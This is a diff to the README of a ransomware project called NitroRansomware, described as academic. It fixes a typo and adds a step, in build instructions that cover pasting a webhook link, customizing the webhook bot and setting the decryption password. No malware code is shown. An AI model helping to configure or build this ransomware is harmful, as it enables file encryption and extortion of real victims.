@@ -36,7 +36,8 @@ NitroRansomware is an academic ransomware made for learning and spreading awaren
 ## Usage
 1. Make sure you have Visual Studio 2019 with C# installed. (.NET Desktop Development) 
 2. Open ```NitroRansomware.sln```, then open ```Program.cs```. 
-3. Pase your webhook link next to ```WEBHOOK```.
-4. You can change the decryption key too, if you want. ```DECRYPT_PASSWORD```
-5. Click on release, then build the solution. Do NOT run it, because it is malware and may encrypt your files.
-6. You can now test it in a protected environment such as a virtual machine.
+3. Paste your webhook link next to ```WEBHOOK```.
+4. If you want, you can customize the avatar of the webhook bot and its name by opening ```Webhook.cs```
+5. You can change the decryption key too, if you want. ```DECRYPT_PASSWORD```
+6. Click on release, then build the solution. Do NOT run it, because it is malware and may encrypt your files.
+7. You can now test it in a protected environment such as a virtual machine.
